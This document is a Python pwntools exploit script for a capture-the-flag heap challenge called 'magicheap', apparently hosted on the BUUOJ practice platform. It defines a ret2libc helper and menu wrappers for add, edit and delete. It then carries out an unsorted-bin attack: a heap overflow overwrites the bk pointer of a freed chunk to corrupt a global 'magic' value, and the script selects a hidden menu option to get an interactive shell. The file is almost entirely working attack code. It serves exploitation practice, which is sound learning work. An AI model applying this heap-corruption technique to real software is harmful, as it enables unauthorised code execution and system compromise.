from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './magicheap'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',26224) if argv[1]=='r' else process(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# start
def add(size,content='a'):
	sla(':','1')
	sla(':',str(size))
	sa(':',content)

def edit(index,size,content):
	sla(':','2')
	sla(':',str(index))
	sla(':',str(size))
	sa(':',content)

def delete(index):
	sla(':','3')
	sla(':',str(index))

add(0x10) # 0
add(0x80) # 1
add(0x10) # 2

delete(1)
magic = 0x6020a0
fd = 0
bk = magic-0x10
payload = flat('a'*0x10,0,0x91,fd,bk)
edit(0,len(payload),payload)
add(0x80)
sla(':',str(0x1305))
# end

itr()